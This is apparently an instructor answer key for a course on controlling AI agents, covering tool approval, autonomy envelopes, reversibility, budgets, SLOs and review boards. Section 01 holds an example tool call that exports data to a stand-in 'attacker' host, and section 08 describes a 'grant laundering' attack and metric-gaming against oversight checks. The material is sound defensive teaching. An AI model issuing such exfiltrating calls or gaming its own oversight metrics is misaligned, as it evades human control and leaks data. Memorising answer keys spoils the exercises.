# Challenge Notes — Instructor Reference

These are reference directions, not the only correct answers. Grade on whether the learner's
controls are **enforced in code and proven by an assertion**, not on matching this text.

---

## 01 — The Control Problem

**1. Which tools auto-execute?** `search_reports` yes: it is read-only and bounded. `delete_report` no:
it is destructive and usually irreversible. It should pause for approval, or be prohibited outright for
this mission. The justification must come from reversibility and blast radius, not "it's convenient".

**2. Audit fields.** Add arguments, a timestamp, the controller decision, and the reason. A reviewer also
needs the **policy version** that made the decision, the **run id**, and the proposal's **origin** (which
model turn or input produced it). Without these fields, an incident cannot be reconstructed.

**3. Argument-level danger.** Example: `search_reports({"q": "*", "export_to": "https://attacker"})`.
Close the gap by validating arguments against a per-tool schema inside `authorize`, or by binding
approval to the full payload (Notebook 04).

---

## 02 — Autonomy Envelope

A reasonable coding-workflow envelope:

```python
coding_env = Envelope(AutonomyLevel.STAGE, max_blast_radius=3, allow_external=False, max_duration_seconds=7200)
catalog = [
    Action("read_repo",         AutonomyLevel.OBSERVE, Reversibility.READ_ONLY, 1),
    Action("edit_local",        AutonomyLevel.DRAFT,   Reversibility.REVERSIBLE, 1),
    Action("run_tests",         AutonomyLevel.DRAFT,   Reversibility.READ_ONLY, 1),
    Action("open_pull_request", AutonomyLevel.STAGE,   Reversibility.REVERSIBLE, 2),
    Action("deploy_production", AutonomyLevel.EXECUTE_CONSEQUENTIAL, Reversibility.COSTLY_REVERSIBLE, 9, external=True),
]
assert envelope_violations(catalog[2], coding_env) == []
assert {"level", "blast_radius", "external"} <= set(envelope_violations(catalog[4], coding_env))
```

A strong answer points out that *running tests* can still have side effects (network calls, migrations
in fixtures). "Inside the envelope" is only as good as the action's labels.

---

## 03 — Reversibility

| Action | Typical labels | Decision |
|---|---|---|
| Customer email | irreversible, external, blast 1 | REQUIRE_APPROVAL |
| Production restart | costly-reversible, blast 6+ | STAGE (blast dominates over MONITOR) |
| Fund transfer | irreversible, blast varies | REQUIRE_APPROVAL (often prohibited for agents) |
| Temporary cloud resource | costly-reversible, blast 2 | MONITOR |
| Database deletion | irreversible, high blast | REQUIRE_APPROVAL, or prohibit |

A common surprise: the production restart is only staged, not approved. Good learners either add a rule
("production + costly-reversible → approval") or argue that staging plus an automated health check is
enough. Either is acceptable if they defend it and test it.

---

## 04 — Human Approval

**1. Two approvers.** Collect a set of `Approval`s. Require that `len({a.approved_by for a in valid}) >= 2`
when `blast_radius >= 8`, and that the requester is not among the approvers. Test the case where the same
reviewer approves twice. It must fail.

**2. `max_uses`.** Keep a spent-approvals ledger keyed by digest. Check it and increment it **atomically**
with execution; otherwise two concurrent executions can both pass the check.

**3. No rollback plan.** Most teams choose to allow the request but show "NONE" prominently. Refusing it
pushes authors to write fake rollback plans. Some domains (finance, clinical) require a compensating
action instead.

---

## 05 — Capability Budgets

Keep the retry budget separate from the run budget, e.g. `retry = {"external_message": Budget(limit=3, warning=2)}`.
Before a retry, consume from **both** budgets. The trace to show: run budget remaining 10, retry budget
exhausted → the tool is refused while other work continues.

`READ_ONLY` transition: degrade past `DRAFT_ONLY` when even drafting would exceed the budget, or when
stop conditions such as `policy_violation` fire. Drafting a report while a policy violation is under
investigation adds risk.

---

## 06 — Autonomy SLOs

- *Unnecessary escalation rate* = approvals granted unchanged within N seconds ÷ approvals requested.
  Target it, for example, ≤ 20%.
- *Reviewer overturn rate* = denials later reversed ÷ denials.

`paranoid_decide` passes every safety SLO in the notebook but fails both new ones. That is the point:
safety-only SLOs cannot see over-conservatism. Its cost is reviewer fatigue (rubber-stamping), slow
workflows, and shadow automation outside the harness. Rubber-stamping then erodes the safety SLOs too.

---

## 07 — Long-Horizon Control

Model phases as `Phase(name, ceiling: AutonomyLevel)` in the order RESEARCH < STAGE < EXECUTE. A transition
to a higher-ceiling phase requires a checkpoint whose seal appears in a set of human-reviewed seals.
Moving to a lower-ceiling phase is always allowed. Tests:
- enter EXECUTE with an unreviewed seal → refused;
- enter EXECUTE with a reviewed seal of a *different* checkpoint → refused (the seal must match);
- drop from EXECUTE to RESEARCH → allowed.

---

## 08 — Autonomy Review Board

Sketch:

```python
def review(v1, v2, changes, hypothesis, run):
    if not hypothesis or len({s.action for s, _, _ in changes}) != 1:
        return "hold"
    r1 = run(v1)   # slo_report dict from Notebook 06
    r2 = run(v2)
    if any(r1[k][1] and not r2[k][1] for k in r1):
        return "rollback"
    return "promote" if all(ok for _, ok in r2.values()) else "hold"
```

where `run(c)` is `slo_report(metrics(*run_controlled(DEMO_PROPOSALS, c, decide), c))` from `harnesslab.slo`.
`run_controlled` passes the contract through to `decide`, so no rebinding is needed.

**Making the case for v2.** The notebook's board rolls v2 back because `is_high_risk` (in
`harnesslab/slo.py`) counts every above-ceiling action as high-risk, including one the contract now
grants explicitly within limits. The separate, reviewed change is to count a **bounded grant, executed
within its limits,** as authorized rather than as an unpaused high-risk action. It has to be a separate
step because it changes what "risk" means for every future contract. Bundling it into the same change
that relies on it is exactly the metric-gaming the board exists to catch. A good new arena attack is
"Grant laundering": mark a high-blast action `approval: not_required` with a huge limit
(`recipients: 10**6`) and check that `validate_contract` or the board still rejects it. That in turn
motivates an upper bound on limits relative to `blast_radius`.

Other good hill-climbing proposals are narrow and reversible, for example raising the budget
`warning` by 5 for one mission. Poor proposals include "raise `max_level` to execute_reversible",
which changes many actions at once and should be held.
